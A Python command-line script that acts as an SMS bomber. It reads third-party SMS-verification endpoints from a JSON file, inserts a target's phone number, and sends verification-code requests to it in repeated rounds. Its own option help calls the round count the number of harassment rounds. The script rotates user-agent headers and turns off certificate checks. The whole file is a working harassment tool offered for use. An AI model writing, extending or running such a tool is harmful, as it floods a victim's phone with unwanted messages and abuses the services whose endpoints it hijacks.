import pathlib
import os
import json
import time
import httpx
import click
from pydantic import BaseModel
from typing import Union
from UA import default_header_user_agent
import sys

if getattr(sys, 'frozen', False):
    path = sys._MEIPASS
elif __file__:
    path = os.path.dirname(__file__)

class API(BaseModel):
    """处理自定义 API 数据"""
    desc="Default"
    url=""
    method="POST"
    header= {}
    data={}

    def handle_API(self, phone):
        pdata=str(self.data).replace("[phone]", phone)
        self.data=json.loads(pdata.replace("'", '"'))

def load_APIPOST():
    json_path = pathlib.Path(path, 'API_POST.json')
    if not json_path.exists():
        raise ValueError
    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [API(**data)  for data in datas]
            return APIs
        except Exception:
            raise ValueError

@click.command()
@click.option("--phone", "-p", help="传递手机号使用-p phone_number", prompt=True, required=True)
@click.option("--times", "-t", help="设置骚扰次数使用-t 次数", default=1,type=int)
def run(phone:str,times:int):
    print(path)
    apis_post=load_APIPOST()
    flag = True
    cnt = 0
    if times > 1:
        flag = False
    with httpx.Client(headers=default_header_user_agent(),verify=False) as client:
        try:
            while flag or times:
                cnt = cnt + 1
                for api in apis_post:
                    api.handle_API(phone)
                    user_agent=default_header_user_agent()
                    resp = client.request(method=api.method, json=api.data,
                        headers=user_agent, url=api.url,timeout=10)
                    print(api.desc+"向号码"+phone+"成功发送短信验证码")
                print("~~~~第%s次短信发送完成~~~~"%cnt)
                if times > 0:
                    times = times-1
                time.sleep(120)
            return True
        except httpx.HTTPError as why:
            print(f"请求失败{why}")
            return False



@click.group()
def cli():
    pass

cli.add_command(run)

if __name__ == "__main__":
    cli()


